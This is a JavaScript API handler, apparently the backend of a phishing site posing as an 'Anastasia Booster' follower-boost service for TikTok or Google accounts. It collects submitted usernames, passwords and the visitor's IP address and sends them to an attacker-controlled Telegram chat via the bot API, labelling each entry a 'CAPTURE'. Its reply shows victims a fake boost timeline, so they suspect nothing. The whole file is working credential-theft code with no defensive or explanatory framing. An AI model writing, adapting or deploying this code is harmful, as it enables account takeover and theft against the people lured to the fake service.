export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'POST Only' });

    const { user, pass, platform } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const text = `🚀 **ANASTASIA BOOSTER : CAPTURE** 🚀\n` +
                 `━━━━━━━━━━━━━━━━━━\n` +
                 `🌐 **PLATEFORME** : ${platform || 'Fusion TikTok/Google'}\n` +
                 `👤 **USER** : \`${user}\`\n` +
                 `🔑 **PASS** : \`${pass}\`\n` +
                 `📍 **IP** : ${ip}\n` +
                 `⏳ **TRAITEMENT** : 10 minutes\n` +
                 `📅 **DURÉE BOOST** : 48 Heures\n` +
                 `━━━━━━━━━━━━━━━━━━`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Erreur Telegram' });
    }
}
